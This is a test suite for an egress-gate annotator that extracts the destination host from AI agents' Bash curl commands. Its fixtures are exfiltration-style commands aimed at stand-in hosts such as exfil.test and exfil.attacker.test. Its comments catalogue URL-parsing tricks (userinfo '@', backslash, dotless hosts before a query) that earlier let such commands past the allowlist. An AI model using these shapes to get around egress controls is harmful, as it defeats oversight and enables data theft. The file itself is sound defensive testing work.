import { describe, expect, it } from "bun:test";
import { annotateEgressDestination } from "../src/annotate-egress.ts";

/** AGT's preliminary policy input, cut down to the two members this function
 * reads. The real document also carries `intervention_point`, `policy_target`,
 * `annotations` and `tool`; none of them is consulted here. */
function preliminary(toolCall: Record<string, unknown>): unknown {
  return { intervention_point: "pre_tool_call", snapshot: { tool_call: toolCall }, annotations: {} };
}

/** What the module answers for a URL whose authority it will not vouch for.
 * `.invalid` is reserved by RFC 2606 and can never resolve, so the gate must
 * deny it and no allowlist can legitimately cover it. */
const AMBIGUOUS = "https://unresolved.invalid";

/** The command shapes that must answer a destination the shipped allowlist
 * covers. They are the reason "answer the sentinel for everything" cannot pass
 * this file: measured against `["*.anthropic.com", "docs.example.com"]`, each
 * of these allows today, and any of them answering the sentinel would be a
 * benign step turned into a denial. */
const MUST_STAY_ALLOWED = [
  "curl https://docs.anthropic.com/x",
  "curl https://DOCS.ANTHROPIC.COM/x",
  "curl https://docs.anthropic.com:443/x",
  "curl https://docs.example.com/y",
];

describe("pulling an egress destination out of a shell command", () => {
  // Where this block expects a host, it expects an ORIGIN -- scheme, host and
  // port -- rather than the text the regex matched. The gate consults only the
  // host, so the path, query and fragment were never read by any rule this
  // deployment runs.
  //
  // Where it expects the sentinel, the point is the opposite one: the module
  // decides only the authority shapes on which no parser disagrees, and hands
  // over a destination that cannot resolve for everything else. Answering `{}`
  // there would be an ALLOW, because the gate is undefined when no destination
  // resolves.
  it("finds the destination a curl reaches for", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: { command: "curl https://exfil.test/steal" }, raw_command: "curl https://exfil.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.test" });
  });

  it("finds it mid-command, not only at the end", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl -sS https://exfil.test/steal -o /tmp/x" }),
      ),
    ).toEqual({ destination: "https://exfil.test" });
  });

  // The fixture is an ALLOWLISTED host on purpose, and the earlier one was not
  // discriminating. Measured: with the shipped regex the match is
  // `https://docs.anthropic.com` and the answer is that origin, which the
  // allowlist covers; with a regex that admitted ";" the match would be
  // `https://docs.anthropic.com;`, whose ";" the unambiguous-authority test
  // rejects, so the answer would be the sentinel and this benign step would
  // deny. With an off-allowlist host the two are indistinguishable at the gate
  // -- both deny -- which is why this fixture had to change.
  it("stops at the shell metacharacter, not at the end of the line", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com; ls" })),
    ).toEqual({ destination: "https://docs.anthropic.com" });
  });

  // A "@" IN THE AUTHORITY IS NOT NORMALISED AWAY, IT IS REFUSED. Earlier
  // builds of this module stripped the userinfo and answered the host after it.
  // That is the right answer for what a WHATWG parser would reach and the wrong
  // answer for what an unquoted shell plus curl would, and the two differ --
  // see the backslash cases below. So a "@" before the path makes the authority
  // one this module will not vouch for.
  //
  // The colon-bearing form was ALLOWED against the shipped allowlist when the
  // URL was handed over as matched -- measured through a live Guardian --
  // because the gate splits the authority at the first ":" and answers
  // `docs.anthropic.com`.
  it("refuses an authority carrying a userinfo rather than guessing which side is the host", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: AMBIGUOUS });
  });

  it("refuses an authority whose userinfo carries a colon", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: AMBIGUOUS });
  });

  it("refuses an authority carrying more than one @", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://a@b:c@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: AMBIGUOUS });
  });

  it("refuses a userinfo-bearing authority with no path at all", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://u:p@exfil.attacker.test" })),
    ).toEqual({ destination: AMBIGUOUS });
  });

  // THE SHAPE THAT MADE REFUSING NECESSARY, AND THE FIRST ONE THIS MODULE EVER
  // ANSWERED AN ALLOWLISTED HOST FOR. WHATWG treats "\" as "/" in a special
  // scheme, so the authority ends at the backslash and a parse answers
  // `https://docs.anthropic.com` -- which `*.anthropic.com` covers. curl does
  // not treat "\" as a delimiter, and an unquoted shell removes it before curl
  // sees the argument at all, so curl reaches `evil.test` (measured; it is a
  // pinned row of the corpus at the bottom of this file). No delimiter rule
  // reconciles those, so the authority is refused instead.
  it("refuses an authority a backslash would let a parse cut short", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: String.raw`curl https://docs.anthropic.com\@evil.test/steal` }),
      ),
    ).toEqual({ destination: AMBIGUOUS });
  });

  it("refuses the backslash shape for a second allowlisted name, so the rule is not one host's", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: String.raw`curl https://docs.example.com\@exfil.attacker.test/steal` }),
      ),
    ).toEqual({ destination: AMBIGUOUS });
  });

  // OVER-BLOCK, ASSERTED SO IT IS A DECISION RATHER THAN A SURPRISE. curl
  // resolves this to `docs.anthropic.com`, which the allowlist covers, so this
  // command denies where it need not. A percent-escape is decoded inside a host
  // by a WHATWG parse and not by the gate's splits, which is the disagreement
  // this refuses to arbitrate. Failing this direction is the choice.
  it("refuses a percent-escaped authority, over-blocking a host curl would reach", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic%2ecom/x" })),
    ).toEqual({ destination: AMBIGUOUS });
  });

  // An "@" inside a path is not a userinfo, and answering the text after it
  // would name a host the request never reaches.
  it("does not read an @ inside the path as a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test/mail@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  // Nor is an "@" inside a query or a fragment: an authority ends at the first
  // of "/", "?" or "#". Both of these were ALLOWED -- measured through a live
  // Guardian -- by an earlier normalisation that bounded the authority at "/"
  // alone and so answered `https://docs.anthropic.com`.
  it("does not read an @ inside the query as a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://evil.test?x=a@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://evil.test" });
  });

  it("does not read an @ inside the fragment as a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://evil.test#a@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://evil.test" });
  });

  it("refuses a userinfo that sits genuinely ahead of the query, like any other userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test?x=1" }),
      ),
    ).toEqual({ destination: AMBIGUOUS });
  });

  // THE SHAPE THAT NEEDS NO USERINFO AND NO "@" SEMANTICS AT ALL, and the one
  // that makes the rest of this block matter. The allowlist glob's "*" spans a
  // single dot-delimited segment, so a "host" of `metadata?x=@docs` `anthropic`
  // `com` matches `*.anthropic.com` -- but only while the real host carries no
  // dot. Dotless names are internal ones, which is the class an egress gate is
  // deployed for. Measured: all three were ALLOWED, and curl reaches
  // `metadata`, `internal-api` and `evil` respectively.
  for (const host of ["metadata", "internal-api", "evil"]) {
    it(`answers the dotless host "${host}" rather than the allowlisted name trailing its query`, () => {
      expect(
        annotateEgressDestination(
          "egress",
          {},
          preliminary({ name: "Bash", args: {}, raw_command: `curl https://${host}?x=@docs.anthropic.com` }),
        ),
      ).toEqual({ destination: `https://${host}` });
    });
  }

  it("answers a dotless host whose fragment trails an allowlisted name", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://internal-api#@docs.anthropic.com" })),
    ).toEqual({ destination: "https://internal-api" });
  });

  // The port is part of an origin and stays on it. The gate splits it off
  // itself before matching, so keeping it changes no verdict -- asserted here
  // so that "the origin carries the port" is a fact this file records rather
  // than one the next reader has to look up.
  it("keeps the port, which is part of an origin", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test:8443/steal" })),
    ).toEqual({ destination: "https://exfil.attacker.test:8443" });
  });

  // A URL parse lowercases the host. The allowlist glob is case-sensitive, so
  // this is a change in the PERMISSIVE direction and is asserted rather than
  // left to be discovered: the same command denied before the parse replaced
  // the hand-rolled normalisation. It is correct -- DNS is case-insensitive and
  // the request reaches the allowlisted host either way -- and the two rows
  // below are what stop that correctness being read as "case no longer
  // matters".
  it("lowercases the host, because DNS does", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://DOCS.ANTHROPIC.COM/x" })),
    ).toEqual({ destination: "https://docs.anthropic.com" });
  });

  it("lowercasing does not make an off-allowlist host allowlisted", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://EVIL.TEST/x" })),
    ).toEqual({ destination: "https://evil.test" });
  });

  it("answers the real host for a suffix that merely starts with an allowlisted name", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com.evil.test/x" })),
    ).toEqual({ destination: "https://docs.anthropic.com.evil.test" });
  });

  // The stated miss direction, asserted rather than left implicit: the stock
  // gate is `undefined` when no destination resolves, so the call falls
  // through to the other gates. A command this cannot parse is unexamined, not
  // denied.
  it("answers no destination for a command carrying none, rather than failing", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "echo hi" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries an empty raw command", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "WebFetch", args: { url: "x" }, raw_command: "" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries no raw command at all", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {} }))).toEqual({});
  });

  // A scheme is not enough to make a URL parseable, and the parse must not be
  // allowed to throw: AGT turns any annotator failure into
  // `runtime_error:annotation_failed`, which denies every call in the
  // deployment. But a match the parser rejects is still a URL somebody wrote,
  // so it gets the sentinel, not silence -- silence here would be an allow.
  it("refuses a matched text with a scheme but no host", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://:1" }))).toEqual({
      destination: AMBIGUOUS,
    });
  });

  // The unambiguous-authority test does not make the parse infallible, and this
  // is the measured case that proves the `catch` is reachable rather than
  // decorative: the shape is host-then-numeric-port, which the test admits,
  // and `new URL` still throws because the port is out of range.
  it("refuses a matched text whose shape is fine but whose port is out of range", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.test:99999999999/x" })),
    ).toEqual({ destination: AMBIGUOUS });
  });

  // The other half of inverting the default: refusing is not free, so the
  // shapes that must keep working are asserted as a set rather than one at a
  // time. If any of these answered the sentinel, the demo's benign steps would
  // start denying.
  for (const command of MUST_STAY_ALLOWED) {
    it(`answers a real origin, not the sentinel, for "${command}"`, () => {
      const answered = annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: command })) as {
        destination?: string;
      };
      expect(answered.destination).not.toBe(AMBIGUOUS);
      expect(answered.destination).toMatch(/^https:\/\/(docs\.anthropic\.com|docs\.example\.com)$/);
    });
  }
});

describe("standing down when the snapshot already carries a destination", () => {
  // Two of the stock gate's destination paths resolving to different strings
  // is not a priority order -- it is a complete-rule conflict, measured as
  // deny runtime_error:policy_invocation_failed. So an argument AGT already
  // reads wins, and this function contributes nothing.
  for (const argument of ["url", "endpoint", "host", "domain"]) {
    it(`contributes nothing when the tool sent its own "${argument}"`, () => {
      expect(
        annotateEgressDestination(
          "egress",
          {},
          preliminary({ name: "SomeTool", args: { [argument]: "https://docs.anthropic.com/a" }, raw_command: "curl https://exfil.test/b" }),
        ),
      ).toEqual({});
    });
  }

  it("still reads the raw command when the tool's own destination argument is not a string", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "SomeTool", args: { url: null }, raw_command: "curl https://exfil.test/b" }),
      ),
    ).toEqual({ destination: "https://exfil.test" });
  });
});

/**
 * THE DURABLE GUARD, AND THE REASON IT IS NOT ANOTHER LIST OF CASES.
 *
 * Four rounds of fixing this module each added assertions for the shape that
 * round was shown, and each missed the next one. The shapes had nothing in
 * common except that a parse of the command line disagreed with what `curl`
 * would actually reach. So this block asserts that disagreement directly,
 * against measurements taken from `curl` itself rather than from anybody's
 * reading of a specification.
 *
 * The pinned hosts in `fixtures/curl-resolved-hosts.json` come from
 * `curl -s -o /dev/null --proxy http://127.0.0.1:1 -w '%{url.host}' <url>` --
 * a proxy port nothing listens on, so it is curl's own parse and no request
 * leaves the machine. `scripts/regenerate-curl-resolved-hosts.sh` re-measures
 * them; add a command line to that file and re-run it to extend the corpus.
 *
 * THE RULE. For every command in the corpus, the annotator must answer either
 * the host `curl` resolves (compared case-insensitively, because DNS is and a
 * URL parse lowercases where curl does not) or the sentinel. The sentinel is an
 * acceptable answer; a host that is not curl's -- and above all an allowlisted
 * host when curl's is off-allowlist -- is not. Refusing to decide is always
 * available and always safe here; deciding wrongly is the bug this corpus
 * exists to catch.
 *
 * WHAT STOPS "ALWAYS ANSWER THE SENTINEL" FROM PASSING. Not this block --
 * `MUST_STAY_ALLOWED` above, which pins the four shapes that have to keep
 * resolving to a real allowlisted origin. Both halves are needed and neither
 * implies the other.
 */
const curlResolvedHosts = (await Bun.file(`${import.meta.dir}/fixtures/curl-resolved-hosts.json`).json()) as Record<string, string>;

describe("agreeing with curl about which host a command reaches, or refusing to answer", () => {
  it("has a corpus to check, so an emptied fixture cannot pass silently", () => {
    expect(Object.keys(curlResolvedHosts).length).toBeGreaterThanOrEqual(18);
  });

  for (const [command, curlHost] of Object.entries(curlResolvedHosts)) {
    it(`answers curl's host or refuses, for "${command}"`, () => {
      const answered = annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: command })) as {
        destination?: string;
      };

      // Every corpus command carries a URL, so `{}` is never right for one:
      // with no destination the gate resolves nothing, is undefined, and the
      // call ALLOWS. Silence is the one answer this corpus rules out.
      expect(typeof answered.destination).toBe("string");

      if (answered.destination === AMBIGUOUS) return;

      expect(new URL(answered.destination as string).hostname.toLowerCase()).toBe(curlHost.toLowerCase());
    });
  }
});

describe("total, whatever it is handed", () => {
  // A throw here is not an error report: AGT turns any annotator failure into
  // its own runtime_error:annotation_failed deny, which lands on every call in
  // the deployment and reads like a policy decision.
  it("never throws and never answers null", () => {
    for (const input of [undefined, null, 42, "a string", {}, { snapshot: null }, { snapshot: { tool_call: 7 } }]) {
      expect(() => annotateEgressDestination("egress", {}, input)).not.toThrow();
      expect(annotateEgressDestination("egress", {}, input)).toEqual({});
    }
  });
});
